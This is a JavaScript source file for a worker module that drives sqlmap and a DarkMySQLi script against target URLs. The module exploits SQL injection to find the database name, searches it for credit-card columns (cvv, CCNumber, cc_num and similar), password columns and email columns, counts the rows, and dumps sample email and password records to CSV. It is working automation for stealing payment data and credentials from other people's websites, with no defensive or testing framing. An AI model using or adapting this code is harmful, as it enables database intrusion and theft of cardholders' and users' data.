'use strict';

const URL = require('url');
const assert = require('assert');
const Err = require('./errors');
const Utils = require('./utils');
const fs = require('fs');
const path = require('path');
const config = require('./config');
const util = require('util');
const cp = require('child_process');
const Promise = require('../modules/bluebird');

class Worker {

  static _parseVersion(str) {
    let arr = str.trim().split(' ');
    if (arr.length < 2) {
      return null;
    }
    let version = arr[1];
    version = version.split('.').splice(0, 2).join('');
    return version;
  };

  static checkDarkSql(url, cb) {
    if (url.indexOf('http://') !== 0 && url.indexOf('https://') !== 0) {
      url = 'http://' + url;
    }
    const darkmysqlPath = '../modules/darkmysql/DarkMySQLi.py';
    const cmd = util.format('python %s -u "%s" --findcol', darkmysqlPath, url);

    let done = false;
    const proc = cp.exec(cmd, (err, stdout, stderr) => {
      if (done) {
	return;
      }
      done = true;
      if (err) {
	if (err.code !== 1) {
	  cb('ENOMEM');
          return;
	}
      }
      const startStr = '[!] darkMySQLi URL: ';
      let startInd = stdout.indexOf(startStr);
      if (startInd === -1) {
        cb(null, null);
        return;
      }
      startInd += startStr.length;
      stdout = stdout.substring(startInd);
      let end = stdout.indexOf('\n');
      assert(end !== -1);
      stdout = stdout.substring(0, end);
      const url = stdout.trim();
      cb(null, url);
    });
    setTimeout(() => {
      if (done) {
	return;
      }
      done = true;
      cb(null, null);
      cb = Function.prototype;
      proc.kill();
    }, 20 * 1000);
  }

  static checkSQLMap(cb) {
    setTimeout(() => {
      cb(null, true);
    }, 0);
    return;
    const cmd = util.format('python %s', config.sqlmapPath);
    cp.exec(cmd, (err, stdout, stderr) => {
      const str = stdout + stderr;
      console.log('eminem');
      console.log(err);
      console.log(stdout);
      console.log(stderr);
      if (str.indexOf('Usage: python sqlmap.py') !== -1) {
        cb(null, true);
      } else {
        cb(null, false);
      }
    });
  }

  static getPythonVersion(cb) {
    const cmd = 'python --version';
    cp.exec(cmd, (err, stdout, stderr) => {
      if (err) {
        cb(err);
      }
      let version = this._parseVersion(stderr);
      cb(null, version);
    });
  }

  static _removeDirRecWithoutChecks(dir) {
    if (fs.existsSync(dir) ) {
      fs.readdirSync(dir).forEach((file,index) => {
        let curPath = dir + '/' + file;
        if (fs.lstatSync(curPath).isDirectory()) { // recurse
          this._removeDirRec(curPath);
        } else { // delete file
          try {
            fs.unlinkSync(curPath);
          } catch (e) {

            console.log(e);
          }
        }
      });
      try {
        fs.rmdirSync(dir);
      } catch (e) {
        console.log(e);
      }

    }
  }

  static _removeDirRec(dir) {
    dir = path.resolve(dir);
    let homeDir = path.resolve('../');
    try {
      let stat = fs.statSync(dir);
      if (!stat.isDirectory()) {
        return;
      }
    } catch (e) {

    }
    if (dir.toString().indexOf(homeDir.toString()) === -1) {
      console.log('%s does not contain %s', homeDir, dir);
      return;
    }
    if (homeDir.toString() === dir.toString()) {
      console.log('can not remove %s', dir);
      return;
    }
    this._removeDirRecWithoutChecks(dir);
  }


  static killPython() {
    try {
      cp.execSync('pkill python');
    } catch (e) {
      console.log(e);
    }
  }

  static removeOutputDir() {
    const outputPath = this._getOutputDirPath();
    this._removeDirRec(outputPath);
  }

  static _getOutputDirPath() {
    const outputDir = config.outputDir;
    const cwd = process.cwd();
    let str = path.join(cwd, outputDir).toString();
    if (str[str.length - 1] !== '/') {
      str += '/';
    }
    return str;
  }

  static _getLogPath(host) {
    const logDir = config.logDir;
    const dir = path.join(process.cwd(), config.logDir);
    try {
      fs.mkdirSync(dir);
    } catch (err) {

    }

    const fname = Utils.makeid(10);

    const str = path.join(process.cwd(), config.logDir, fname);
    return str;
  }

  static _formatHost(host) {
    host = host.trim();
    if (host.indexOf('http://') === 0) {
      host = host.substring(7);
    } else if (host.indexOf('https://') === 0) {
      host = host.substring(8);
    }
  }

  static _printCMD(program, args) {
    console.log('cmd is: %s %s', program, args.join(' '));
  }

  static _extractDBName(stdout, data) {
    const lastLine = stdout.substring(stdout.lastIndexOf('/'));
    const lastData = lastLine + data.toString();
    const arr = lastData.split('\n');
    for (let i = 0; i < arr.length; i++) {
      let line = arr[i];
      const str = 'current database:';
      const index = line.indexOf(str);
      if (index === -1) {
        continue;
      }
      let db = line.substring(index + str.length).trim();
      db = db.substring(1, db.length - 1);
      return db;
    }
    return null;
  }

  static _parsePasswordTable(tableStr) {
    tableStr = tableStr.trim();
    const l = tableStr.split('\n');
    l.shift();

    const table1 = l[0].split(' ');
    if (table1.length < 2) {
      return null;
    }
    const table = table1[1];
    for (let i = 0; i < 5; i++) {
      l.shift();
    }
    l.pop();
    const result = {
      tableName: table
    };
    const columns = [];
    for (let i = 0; i < l.length; i++) {
      const line = l[i].split('|');
      if (line.length <= 1) {
        continue;
      }
      const columnName = line[1].trim();
      columns.push(columnName);
    }
    result.columns = columns;
    return result;
  }

  static _parsePasswordTables(stdout) {
    const arr = stdout.split('\n');
    const startStr = 'found in the following databases:';
    const startInd = stdout.indexOf(startStr);
    if (startInd === -1) {
      throw new Err.PasswordsNotFound();
    }
    stdout = stdout.substring(startInd + startStr.length);
    const endStr = 'do you want to dump entries?';
    const endInd = stdout.indexOf(endStr);
    if (endInd === -1) {
      throw new Err.invalidOutput(stdout);
    }
    stdout = stdout.substring(0, endInd).trim();
    const l = stdout.split('Database:');
    const tables = [];
    for (let i = 0; i < l.length; i++) {
      const item = l[i];
      if (item.length === 0) {
        continue;
      }
      const table = this._parsePasswordTable(item);
      if (!table) {
        continue;
      }
      tables.push(table);
    }
    if (tables.length === 0) {
      throw new Err.PasswordsNotFound();
    }
    return tables;
  }

  static _parseEmailColumns(stdout) {
    const arr = stdout.split('\n');
    const res = [];
    const startStr = 'found in the following databases:';
    const startInd = stdout.indexOf(startStr);
    if (startInd === -1) {
      return [];
    }
    stdout = stdout.substring(startInd + startStr.length);
    const endStr = 'do you want to dump entries';
    const endInd = stdout.indexOf(endStr);
    if (endInd === -1) {
      throw new Err.InvalidOutput(stdout);
    }
    stdout = stdout.substring(0, endInd).trim();
    console.log(stdout);
    const l = stdout.split('\n');
    for (let i = 0; i < 6; i++) {
      l.shift();
    }
    l.pop();
    for (let i = 0; i < l.length; i++) {
      const line = l[i].trim();
      const t = line.split('|');
      if (t.length !== 4) {
        continue;
      }
      const name = line.split('|')[1].trim();
      res.push(name);
    }
    return res;
  }


  static _getNumEntriesInTables(url, args, postData, DBName, tableNames,
                                cb) {
    console.log('getting num entries in tables:');
    console.log(tableNames);
    tableNames = tableNames.join(',');
    const allArgs = [config.sqlmapPath, '-u', url, '-D', DBName, postData,
                     '-T', tableNames, '--count',
                     '--batch', '--answers',
                     'do you want to dump entries?=N'].concat(args);
    this._printCMD('python', allArgs);
    const options = {
      detached: false
    };
    const proc = cp.spawn('python', allArgs, options);
    let stdout = '';
    let stderr = '';
    proc.stdout.on('data', d => {
      stdout += d.toString();
      console.log(d.toString());
      const index = stdout.indexOf('Database: ');
      if (index > -1 && index < stdout.length - 5000) {
        console.log('killing this bitch');
        proc.stdout.destroy();
        proc.stdin.destroy();
        proc.stderr.destroy();
        proc.kill();
      }
    });
    proc.stdout.on('error', e => { });
    proc.stderr.on('data', d => {
      stderr += d.toString();
      console.log(d.toString());
    });
    proc.on('error', e => {
      console.log(e);
      throw e;
    });
    proc.on('close', () => {
      const startInd = stdout.indexOf('Database: ');
      if (startInd === -1) {
        throw new Err.InvalidOutput(stdout);
      }
      stdout = stdout.substring(startInd);
      let l = stdout.split('\n');
      let i = 4;
      const result = [];
      while (true) {
        const item = l[i];
        const c = item.split('|');
        if (c.length <= 1) {
          break;
        }
        const name = c[1].trim();
        const n = parseInt(c[2].trim());
        result.push({
          name: name,
          n: n
        });
        i++;
      }
      console.log('result is: ');
      console.log(result);
      cb(null, result);
    });
  }

  static _getNumEntriesInTable(url, args, postData, DBName, tableName,
                               columns, cb) {
    console.log('getting num entries in table: %s', tableName);
    const columnsStr = columns.join(',');
    const allArgs = [config.sqlmapPath, '-u', url, '-D', DBName, postData,
                     '-C', columnsStr, '-T', tableName, '--count',
                     '--batch', '--answers',
                     'do you want to dump entries?=N'].concat(args);
    this._printCMD('python', allArgs);
    const options = {
      detached: false
    };
    const proc = cp.spawn('python', allArgs, options);
    let stdout = '';
    let stderr = '';
    proc.stdout.on('data', d => {
      stdout += d.toString();
      console.log(d.toString());
      const index = stdout.indexOf('Database: ');
      if (index > -1 && index < stdout.length - 200) {
        console.log('killing this bitch');
        proc.stdout.destroy();
        proc.stdin.destroy();
        proc.stderr.destroy();
        proc.kill();
      }
    });
    proc.stdout.on('error', e => { });
    proc.stderr.on('data', d => {
      stderr += d.toString();
      console.log(d.toString());
    });
    proc.on('error', e => {
      console.log(e);
      throw e;
    });
    proc.on('close', () => {
      const startInd = stdout.indexOf('Database: ');
      if (startInd === -1) {
        throw new Err.InvalidOutput(stdout);
      }
      stdout = stdout.substring(startInd);
      let l = stdout.split('\n');
      const item = l[4];
      l = item.split('|');
      const n = parseInt(l[2].trim());
      cb(null, n);
    });
  }

  static _dumpTable(url, args, postData, DBName, tableName, columns, logFile,
                    cb) {
    this._getNumEntriesInTableAsync(url, args, postData, DBName, tableName,
                                    columns)
      .then(n => {
        console.log('dumping table: %s %s', DBName, tableName);
        console.log('num entries is: %d', n);
        const string = columns.join(' ');
        console.log(string);
        const columnsStr = columns.join(',');
        const start = parseInt(n / 2 + 1);
        const end = start + 3;
        const allArgs = [config.sqlmapPath, '-u', url, '-D', DBName,
                         postData, '-T', tableName, '-C', columnsStr,
                         '--dump', '--batch',
                         '--answers',
                         'do you want to crack them via a dictionary-based attack?=N',
                         //                         'do you want to dump entries?=N',
                         '--start=' + start, '--stop=' + end].concat(args);
        this._printCMD('python', allArgs);
        const options = {
          detached: false
        };
        const proc = cp.spawn('python', allArgs, options);
        let stdout = '';
        let stderr = '';
        proc.stdout.on('data', d => {
          console.log(d.toString());
          stdout += d.toString();
          const ind = stdout.indexOf('dumped to CSV file ');
          if (ind > -1 && ind < stdout.length - 1000) {
            proc.stdout.destroy();
            proc.stderr.destroy();
            proc.stdin.destroy();
            proc.kill();
          }
        });
        proc.stdout.on('error', e => { });
        proc.stderr.on('data', d => {
          console.log(d.toString());
          stderr += d.toString();
        });
        proc.stderr.on('error', e => { });
        proc.on('error', e => {
          console.log(e);
          throw e;
        });
        proc.on('close', () => {
          const startInd = stdout.indexOf('dumped to CSV file ');
          if (startInd === -1) {
            throw new Err.InvalidOutput(stdout);
          }
          stdout = stdout.substring(startInd);
          const endInd = stdout.indexOf('\n');
          if (endInd === -1) {
            throw new Err.invalidOutput(stdout);
          }
          stdout = stdout.substring(0, endInd).trim();
          const filePath = stdout.split('\'')[1];
          console.log('file path is: %s', filePath);
          const content = fs.readFileSync(filePath).toString();
          cb(null, {
            columns: columns,
            db: DBName,
            entries: n,
            table: tableName,
            content: content
          });
        });
      });

  }

  static _getEmailColumns(url, args, DBName, tableName, cb) {
    console.log('getting email columns: %s %s %s', url, DBName, tableName);
    const allArgs = [config.sqlmapPath, '-u', url, '-D', DBName,
                     '-T', tableName, '--search', '-C', 'email',
                     '--batch', '--answers',
                     'do you want to dump entries?=N'].concat(args);
    this._printCMD('python', allArgs);
    const options = {
      detached: false
    };
    const proc = cp.spawn('python', allArgs, options);
    let stdout = '';
    let stderr = '';
    proc.stdout.on('data', d => {
      stdout += d.toString();
      console.log(d.toString());
      if (stdout.indexOf('do you want to dump entries') !== -1) {
        proc.stdout.destroy();
        proc.stderr.destroy();
        proc.stdin.destroy();
        proc.kill();
      }
    });
    proc.stdout.on('error', e => { });
    proc.stderr.on('data', d => {
      stderr += d.toString();
      console.log(d.toString());
    });
    proc.stderr.on('error', e => { });
    proc.on('error', e => {
      console.log(e);
      throw e;
    });
    proc.on('close', () => {
      try {
        const columns = this._parseEmailColumns(stdout);
        cb(null, columns);
      } catch (e) {
        console.log(e);
        cb(e);
      }
    });

  }

  static _getCTables(url, args, DBName, cb) {
    const allArgs = [config.sqlmapPath, '-u', url, '-D', DBName,
                     '--search',
                     '-C',
                     'cvv,secCode,CardCode,CV2,CCNumber,cc_num,cardno,CcNo,ccv',
                     //                     'pass,mail,shit',
                     '--batch',
                     '--answers', 'do you want to dump entries?=N'].concat(args);
    this._printCMD('python', allArgs);
    const options = {
      detached: false
    };
    const proc = cp.spawn('python', allArgs, options);
    let stdout = '';
    let stderr = '';
    proc.stdout.on('data', d => {
      stdout += d.toString();
      console.log(d.toString());
      if (stdout.indexOf('do you want to dump entries?') !== -1) {
        proc.stdout.destroy();
        proc.stderr.destroy();
        proc.stdin.destroy();
        proc.kill();
      }
    });
    proc.stdout.on('error', e => {
      console.log(e);
    });
    proc.stderr.on('data', d => {
      stderr += d.toString();
      console.log(d.toString());
    });
    proc.stderr.on('error', e => {
      console.log(e);
    });
    proc.on('error', e => {
      console.log(e);
      throw e;
    });
    proc.on('close', () => {
      try {

        console.log(stdout);
        const tables = this._parsePasswordTables(stdout);
        console.log('tables are: ');
        console.log(tables);
        cb(null, tables);
      } catch (e) {
        console.log(e);
        cb(e);
      }
      console.log('finished');
    });

  }

  static _getPasswordTables(url, args, DBName, cb) {
    const allArgs = [config.sqlmapPath, '-u', url, '-D', DBName,
                     '--search', '-C', 'passw', '--batch',
                     '--answers', 'do you want to dump entries?=N'].concat(args);
    this._printCMD('python', allArgs);
    const options = {
      detached: false
    };
    const proc = cp.spawn('python', allArgs, options);
    let stdout = '';
    let stderr = '';
    proc.stdout.on('data', d => {
      stdout += d.toString();
      console.log(d.toString());
      if (stdout.indexOf('do you want to dump entries?') !== -1) {
        proc.stdout.destroy();
        proc.stderr.destroy();
        proc.stdin.destroy();
        proc.kill();
      }
    });
    proc.stdout.on('error', e => {
      console.log(e);
    });
    proc.stderr.on('data', d => {
      stderr += d.toString();
      console.log(d.toString());
    });
    proc.stderr.on('error', e => {
      console.log(e);
    });
    proc.on('error', e => {
      console.log(e);
      throw e;
    });
    proc.on('close', () => {
      try {
        const tables = this._parsePasswordTables(stdout);
        cb(null, tables);
      } catch (e) {
        console.log(e);
        cb(e);
      }
      console.log('finished');
    });
  }

  static _getDBName(host, args, cb) {
    const allArgs = [config.sqlmapPath, '-u', host, '--current-db', '--batch',
                     '--answers', 'do you want to dump entries?=N'].concat(args);
    const options = {
      detached: false
    };
    let db = '';
    this._printCMD('python', allArgs);
    const proc = cp.spawn('python', allArgs, options);
    //const a = fs.readFileSync('/proc/' + proc.pid + '/cmdline').toString();
    let stdout = '';
    let stderr = '';
    proc.stdout.on('data', d => {
      console.log(d.toString());
      const lastLine = stdout.substring(stdout.lastIndexOf('/'));
      db = this._extractDBName(stdout, d.toString());
      console.log('db name is: %s', db);
      stdout += d.toString();
      if (db) {
        try {
          proc.stdout.destroy();
        } catch (e) { }
        try {
          proc.stderr.destroy();
          proc.stdin.destroy();
        } catch (e) { }
        proc.kill();
      }
    });
    proc.stdout.on('close', () => {
      console.log('stdout closed');
    });
    proc.stdout.on('error', err => {
      console.log('stdout error');
      console.log(err);

    });

    proc.stderr.on('data', d => {
      console.log(d.toString());
      stderr += d.toString();
    });
    proc.stderr.on('err', err => {
      console.log('stderr error');
      console.log(err);
    });
    proc.stderr.on('close', () => {
      console.log('stderr closed');
    });

    proc.on('error', err => {
      console.log(err);
      throw err;
    });

    proc.on('close', () => {
      console.log('process finished');
      if (!db) {
        cb(new Err.DBNotFound(stdout, stderr));
        return;
      }
      cb(null, {
        db: db
      });
    });

  }

  static _getURLAndPostData(host, outputPath) {
    const filePath = path.join(outputPath, host, 'target.txt');
    const content = fs.readFileSync(filePath).toString().trim().split('\n');
    let arr = [];
    for (let i = 0; i < content.length; i++) {
      const line = content[i].trim();
      if (line.length === 0) {
        continue;
      }
      arr.push(line);
    }
    const url = arr[0].split(' ')[0];
    let postData = '';
    if (arr.length > 1) {
      postData = arr[1];
    }
    return {
      url: url,
      postData: postData
    };
  }


  static checkHostC(host, postData, technique, args, cb) {
    console.log('checking host for C: %s %s %s', host, technique, args);
    const outputPath = this._getOutputDirPath();
    const logPath = this._getLogPath();
    if (postData) {
      args.push(util.format('--data=%s', postData));
    }
    args.push('--technique=' + technique);
    args.push('--output-dir=' + outputPath);

    const hostname = URL.parse(host).host || host;

    let targetURL = '';
    let DBName = '';
    let url = host;
    let tables = [];
    let dirToRemove = '';
    this._getDBNameAsync(host, args)
      .timeout(60 * 60 * 1000)
      .then(resp => {
        console.log(resp);
        DBName = resp.db;
        assert(DBName);
        const urlAndPostData = this._getURLAndPostData(hostname, outputPath);
        url = urlAndPostData.url;
        targetURL = urlAndPostData.url;
        if (!postData) {
          postData = urlAndPostData.postData;
          if (postData.length > 0) {
            args.unshift(util.format('--data=%s', postData));
          }
        }
        const dir = path.join(outputPath, hostname, 'dump', DBName);
        dirToRemove = dir;

        return this._getCTablesAsync(url, args, DBName);
      })
      .then(resp => {
        tables = resp || [];
        if (tables.length === 0) {
          return [];
        }
        /*
         [ { tableName: 'species_information',
         columns: [ 'speciesBodySizeFemailMature' ] },
         { tableName: 'fuel_users', columns: [ 'email' ] },
         { tableName: 'fuel_users', columns: [ 'password' ] } ]
         asdasdaushdiausdh
         [ { tableName: 'species_information',
         columns: [ 'speciesBodySizeFemailMature' ] },
         { tableName: 'fuel_users', columns: [ 'email' ] },
         { tableName: 'fuel_users', columns: [ 'password' ] } ]
         */
        console.log('asdasdaushdiausdh');
        console.log(resp);
        const tableNames = [];
        for (let i = 0; i < resp.length; i++) {
          if (tableNames.indexOf(resp[i].tableName) !== -1) {
            continue;
          }
          tableNames.push(resp[i].tableName);
        }
        console.log(tableNames);
        return this._getNumEntriesInTablesAsync(url, args, postData, DBName,
                                                tableNames);
      })
      .then(resp => {
        const result = [];
        for (let i = 0; i < tables.length; i++) {
          const name = tables[i].tableName;
          const columns = tables[i].columns;
          for (let j = 0; j < resp.length; j++) {
            if (resp[j].name !== name) {
              continue;
            }
            const n = resp[j].n;
            result.push({
              targetURL: targetURL,
              tableName: name,
              columns: columns,
              n: n,
              db: DBName
            });
          }
        }
        console.log('totti');
        console.log(result);
        /*
         [ { name: 'species_information', n: 869 },
         { name: 'fuel_users', n: 12 },
         { name: 'fuel_users', n: 12 } ]
         */
        console.log(resp);
        cb(null, result);
      })
      .catch(Promise.TimeoutError, e => {
        throw new Err.DBNotFound();
      })
      .catch(Err.DBNotFound, e => {
        cb(e);
      })
      .catch(e => {
        cb(e);
      })
      .finally(() => {
        if (dirToRemove.length > 0) {
          console.log('removing: %s', dirToRemove);
          this._removeDirRec(dirToRemove);
        }
      });




  }

  static checkHost(host, postData, technique, args, cb) {
    console.log('checking host: %s %s %s', host, technique, args);
    const outputPath = this._getOutputDirPath();
    const logPath = this._getLogPath();
    if (postData) {
      args.push(util.format('--data=%s', postData));
    }
    args.push('--technique=' + technique);
    args.push('--output-dir=' + outputPath);

    const hostname = URL.parse(host).host || host;

    let DBName = '';
    let url = host;
    let targetURL = '';
    let pData = '';

    this._getDBNameAsync(host, args)
      .timeout(60 * 60 * 1000)
      .then(resp => {
        console.log(resp);
        DBName = resp.db;
        assert(DBName);
        const urlAndPostData = this._getURLAndPostData(hostname, outputPath);
        url = urlAndPostData.url;
        targetURL = url;
        pData = urlAndPostData.postData;
        if (!postData) {
          postData = urlAndPostData.postData;
          if (postData.length > 0) {
            args.unshift(util.format('--data=%s', postData));
          }
        }
        const dir = path.join(outputPath, hostname, 'dump', DBName);
        console.log('removing: %s', dir);
        this._removeDirRec(dir);
        return this._getPasswordTablesAsync(url, args, DBName);
      })
      .then(resp => {
        const arr = resp;
        const result = [];
        let isRunning = false;
        const func = Promise.promisify((arr, cb) => {
          const intervalID = setInterval(() => {
            if (isRunning) {
              return;
            }
            const table = arr.pop();
            console.log('popped');
            console.log(table);
            console.log(arr);
            if (!table) {
              clearInterval(intervalID);
              cb(null, result);
              return;
            }
            const tableName = table.tableName;
            isRunning = true;
            this._getEmailColumns(url, args,  DBName, tableName,
                                  (err, resp) => {
                                    isRunning = false;
                                    if (err) {
                                      console.log(err);
                                      throw err;
                                    }
                                    if (resp.length === 0) {
                                      return;
                                    }
                                    for (let i = 0; i < resp.length; i++){
                                      table.columns.unshift(resp[i]);
                                    }
                                    console.log('pushing');
                                    result.push(table);
                                    console.log(table);
                                    console.log(resp);
                                  });
          }, 10);
        });
        console.log(resp);
        return func(resp);
        /*
         [ { tableName: 'hc_admin', columns: [ 'Passwrd' ] },
         { tableName: 'hc_users', columns: [ 'Password' ] } ]

         */
      })
      .then(resp => {
        if (resp.length === 0) {
          throw new Err.EmailsNotFound();
        }

        const arr = resp;
        const result = [];;
        let isRunning = false;
        const func = Promise.promisify((arr, cb) => {
          const intervalID = setInterval(() => {
            if (isRunning) {
              return;
            }
            const table = arr.pop();
            if (!table) {
              clearInterval(intervalID);
              cb(null, result);
              return;
            }
            const tableName = table.tableName;
            const columns = table.columns;
            isRunning = true;
            this._dumpTable(url, args, postData, DBName, tableName,
                            columns, logPath, (err, resp) => {
                              isRunning = false;
                              if (err) {
                                console.log(err);
                                throw err;
                              }
                              resp.targetURL = targetURL;
                              resp.postData = pData;
                              result.push(resp);
                            });
          }, 10);
        });
        /*
         [ { tableName: 'hc_users', columns: [ 'Email', 'Password' ] },
         { tableName: 'hc_admin', columns: [ 'Email', 'Passwrd' ] } ]
         */
        console.log(resp);
        return func(resp);
      })
      .then(resp => {
        console.log('final result is: here');
        console.log(resp);
        cb(null, resp);
      })
      .catch(Promise.TimeoutError, e => {
        throw new Err.DBNotFound();
      })
      .catch(Err.DBNotFound, e => {
        cb(e);
      });
  }


};

(function() {
  Promise.promisifyAll(Worker, {
    filter: function() {
      return true;
    }
  });
}());

module.exports = Worker;
